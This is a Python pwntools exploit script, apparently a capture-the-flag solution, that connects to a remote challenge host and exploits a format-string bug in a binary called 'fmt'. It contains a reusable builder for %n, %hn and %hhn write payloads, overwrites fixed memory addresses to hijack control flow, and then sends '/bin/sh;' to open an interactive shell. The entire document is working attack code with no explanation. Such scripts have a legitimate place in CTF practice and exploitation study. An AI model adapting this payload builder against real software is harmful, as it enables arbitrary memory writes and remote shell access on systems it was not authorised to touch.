#!/usr/bin/env python
from pwn import *

def format_str(plist, fixed=False, start=0):
    s = ''
    ttl = start
    blk = 0
    cnt = 0

    # l = (pos, value, size)
    idx = 0
    while idx < len(plist):
        pos, val, size = plist[idx]
        mx = 2**(size*8)
        cnt += 1

        if not fixed:
            if pos == blk+1:
                if val != ttl % mx:
                    raise Exception('No enough block to adjust value')
                else:
                    pass
            elif pos > blk+1:
                s += '%c'*(pos-blk-2)
                ttl += pos-blk-2
                blk += pos-blk-2
                exceed = ttl % mx
                if exceed > val:
                    s += '%{}c'.format(mx - exceed + val)
                    ttl += mx - exceed + val
                    blk += 1
                elif exceed < val:
                    s += '%{}c'.format(val - exceed)
                    ttl += val - exceed
                    blk += 1
                else:
                    pass
            else:
                fixed = True
                continue
        else:
            # if it's the final one than use '$' sign
            exceed = ttl % mx
            if exceed > val:
                s += '%{}c'.format(mx - exceed + val)
                ttl += mx - exceed + val
                blk += 1
            elif exceed < val:
                s += '%{}c'.format(val - exceed)
                ttl += val - exceed
                blk += 1
            else:
                pass

        if not fixed:
            if size == 8:
                s += '%ln'
            elif size == 4:
                s += '%n'
            elif size == 2:
                s += '%hn'
            else:
                s += '%hhn'
        else:
            if size == 8:
                s += '%{}$ln'.format(pos)
            elif size == 4:
                s += '%{}$n'.format(pos)
            elif size == 2:
                s += '%{}$hn'.format(pos)
            else:
                s += '%{}$hhn'.format(pos)
        blk += 1
        idx += 1

    return s

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
#r = process('./fmt')
r = remote('pwn.byteband.it', 6969)

payload = format_str([
    (13, 0xf7, 1),
    (14, 0x11, 1),
    (15, 0x40, 1),
], True).ljust(0x38, '\0') + flat(0x404028, 0x404029, 0x40402a)

r.sendlineafter(': ', '2')
r.sendafter('gift.\n', payload)

payload = '/bin/sh;' + format_str([
    (15, 0x56, 1),
    (16, 0x10, 1),
    (17, 0x40, 1),
    (18, 0, 1),
    (19, 0, 1),
    (20, 0, 1)
], True, 8).ljust(0x40) + flat(
    0x404038,
    0x404039,
    0x40403a,
    0x40403b,
    0x40403c,
    0x40403d
)

r.sendlineafter(': ', '2')
r.sendafter('gift.\n', payload)

r.sendlineafter(': ', '2')
r.sendafter('gift.\n', 'A')

r.interactive()
